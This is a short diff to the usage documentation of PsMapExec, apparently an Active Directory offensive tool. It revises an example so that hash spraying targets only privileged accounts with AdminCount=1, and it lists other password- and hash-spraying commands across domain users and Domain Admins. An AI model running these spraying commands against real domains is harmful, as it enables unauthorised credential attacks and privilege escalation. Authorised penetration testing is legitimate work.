@@ -71,8 +71,8 @@ PsMapExec -Targets C:\temp\Systems.txt -Method WMI
 # Spray passwords across all accounts in the domain
 PsMapExec -Method Spray -SprayPassword [Password]
 
-# Spray Hashes across all accounts in the domain
-PsMapExec -Method Spray -SprayHash [Hash]
+# Spray Hashes across all accounts in the domain that have AdminCount=1
+PsMapExec -Targets "AdminCount=1" -Method Spray -SprayHash [Hash]
 
 # Spray Hashes across all Domain Admin group users
 PsMapExec -Targets "Domain Admins" -Method Spray -SprayHash [Hash]
